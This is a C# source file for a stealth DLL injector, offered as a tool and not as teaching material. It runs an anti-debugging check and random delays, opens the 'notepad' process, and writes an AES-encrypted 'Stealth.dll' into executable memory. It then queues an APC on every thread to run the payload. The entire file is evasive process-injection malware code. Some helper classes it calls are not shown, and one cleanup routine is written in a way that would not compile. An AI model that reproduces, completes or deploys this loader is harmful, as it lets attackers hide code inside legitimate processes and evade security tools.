
using System;
using System.Diagnostics;
using System.IO;

class Injector
{
    public static void Main()
    {
        AntiDebugging.Check();

        string targetProcessName = "notepad";
        Process targetProcess = GetTargetProcess(targetProcessName);
        if (targetProcess == null)
        {
            Console.WriteLine("Target process not running.");
            return;
        }

        Utility.RandomDelay();

        byte[] key = Utility.GenerateRandomBytes(32); // AES-256 key
        byte[] iv = Utility.GenerateRandomBytes(16);  // AES block size IV

        string dllPath = @"C:\\Path\\To\\Your\\Stealth.dll"; // Replace with your path
        byte[] dllBuffer = File.ReadAllBytes(dllPath);
        byte[] encryptedDllBuffer = Encryption.EncryptData(dllBuffer, key, iv);

        IntPtr procHandle = NativeMethods.OpenProcess(NativeMethods.PROCESS_ALL_ACCESS, false, targetProcess.Id);
        if (procHandle == IntPtr.Zero)
        {
            Console.WriteLine("Failed to open target process.");
            return;
        }

        Utility.RandomDelay();

        IntPtr allocMemAddress = AllocateMemory(procHandle, encryptedDllBuffer.Length);
        if (allocMemAddress == IntPtr.Zero)
        {
            Cleanup(procHandle);
            return;
        }

        if (!WriteMemory(procHandle, allocMemAddress, encryptedDllBuffer))
        {
            Cleanup(procHandle, allocMemAddress);
            return;
        }

        byte[] compiledCode = Encryption.CompileDecryptionCode(key, iv);
        IntPtr codeAddress = AllocateMemory(procHandle, compiledCode.Length);
        if (codeAddress == IntPtr.Zero)
        {
            Cleanup(procHandle, allocMemAddress);
            return;
        }

        if (!WriteMemory(procHandle, codeAddress, compiledCode))
        {
            Cleanup(procHandle, allocMemAddress, codeAddress);
            return;
        }

        QueueApcForAllThreads(targetProcess, codeAddress, allocMemAddress);
        Console.WriteLine("DLL injection via APC queued.");
        NativeMethods.CloseHandle(procHandle);
    }

    private static Process GetTargetProcess(string processName)
    {
        Process[] processes = Process.GetProcessesByName(processName);
        return processes.Length > 0 ? processes[0] : null;
    }

    private static IntPtr AllocateMemory(IntPtr procHandle, int size)
    {
        IntPtr baseAddress = IntPtr.Zero;
        uint regionSize = (uint)size;
        uint result = NativeMethods.NtAllocateVirtualMemory(procHandle, ref baseAddress, IntPtr.Zero, ref regionSize, NativeMethods.MEM_COMMIT | NativeMethods.MEM_RESERVE, NativeMethods.PAGE_EXECUTE_READWRITE);
        if (result != 0)
        {
            Console.WriteLine("Failed to allocate memory in target process.");
            return IntPtr.Zero;
        }
        return baseAddress;
    }

    private static bool WriteMemory(IntPtr procHandle, IntPtr address, byte[] buffer)
    {
        uint bytesWritten;
        uint result = NativeMethods.NtWriteVirtualMemory(procHandle, address, buffer, (uint)buffer.Length, out bytesWritten);
        if (result != 0 || bytesWritten != buffer.Length)
        {
            Console.WriteLine("Failed to write to target process memory.");
            return false;
        }
        return true;
    }

    private static void Cleanup(IntPtr procHandle, params IntPtr[] addresses)
    {
        foreach (var address in addresses)
        {
            uint regionSize = 0;
            NativeMethods.NtFreeVirtualMemory(procHandle, ref address, ref regionSize, NativeMethods.MEM_RELEASE);
        }
        NativeMethods.CloseHandle(procHandle);
    }

    private static void QueueApcForAllThreads(Process targetProcess, IntPtr codeAddress, IntPtr allocMemAddress)
    {
        foreach (ProcessThread thread in targetProcess.Threads)
        {
            IntPtr threadHandle = NativeMethods.OpenThread(NativeMethods.THREAD_SET_CONTEXT, false, (uint)thread.Id);
            if (threadHandle != IntPtr.Zero)
            {
                NativeMethods.QueueUserAPC(codeAddress, threadHandle, allocMemAddress);
                NativeMethods.CloseHandle(threadHandle);
            }
        }
    }
}
